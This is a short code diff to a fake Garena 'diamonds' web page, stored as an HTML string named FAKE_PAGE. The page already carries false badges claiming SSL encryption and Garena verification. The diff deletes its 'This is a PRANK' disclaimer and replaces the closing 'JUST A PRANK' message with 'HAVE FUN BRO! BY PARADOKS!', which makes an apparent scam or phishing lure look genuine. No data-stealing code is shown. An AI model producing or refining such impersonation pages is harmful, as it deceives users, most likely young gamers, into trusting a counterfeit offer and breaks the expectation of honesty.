@@ -397,7 +397,6 @@ FAKE_PAGE = """
             
             <div class="warning">
                 🔒 256-bit SSL Encrypted | ✅ Verified by Garena<br>
-                ⚠️ This is a PRANK! For entertainment only.
             </div>
         </div>
     </div>
@@ -466,7 +465,7 @@ FAKE_PAGE = """
                         💎 Your diamonds are being processed
                     </div>
                     <br>
-                    <small style="opacity: 0.8;">😂 JUST A PRANK! 😂<br>Your friend got you!</small>
+                    <small style="opacity: 0.8;">✨ HAVE FUN BRO! ✨<br>BY PARADOKS!</small>
                 `;
                 
                 // Start countdown timer
